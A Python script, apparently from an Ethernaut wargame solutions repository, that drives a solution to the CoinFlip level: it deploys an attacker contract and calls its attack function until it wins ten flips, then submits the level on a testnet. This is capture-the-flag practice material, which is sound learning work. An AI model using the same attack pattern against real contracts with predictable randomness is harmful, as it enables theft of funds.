from ape import accounts, project
from .utils.helper import get_level_instance, level_completed
import time

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0xaCB258afa213Db8E0007459f5d3851c112d2fA8d"
WAIT_TIME = 30


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.CoinFlip.deploy(instance, sender=user)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")
    while hacker.wins() < 10:
        hacker.attack(sender=user)
        time.sleep(WAIT_TIME)
    assert hacker.wins() == 10, "you don't have 10 wins"

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
